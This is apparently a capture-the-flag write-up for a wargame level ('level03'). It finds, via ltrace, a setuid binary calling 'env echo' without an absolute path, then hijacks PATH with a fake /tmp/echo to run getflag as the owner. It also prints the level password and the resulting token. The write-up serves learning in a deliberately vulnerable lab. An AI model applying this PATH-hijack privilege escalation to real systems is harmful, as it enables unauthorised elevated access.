`su level03 -> kooda2puivaav1idi4f57q8iq`

Check the permissions of the file:

```bash
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The binary is owned by flag03, and it prints "Exploit Me". it also has the s permission, which means it will be run as flag03, so we would like this binary to execute getflag.

With ltrace level03, we see that this executable runs the line: `system("/usr/bin/env echo Exploit me")`.

```bash
$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                       = 2003
geteuid()                                                       = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)             = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

We try to modify echo with `echo getflag > /bin/echo` but i obviously doesn't work.

One exploit that is present in the level03 executable, is that echo is not designed with an absolute path, so we could make it use our own echo.

```bash
$ echo getflag > /tmp/echo
$ chmod +x /tmp/echo
$ export PATH="/tmp:$PATH"
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
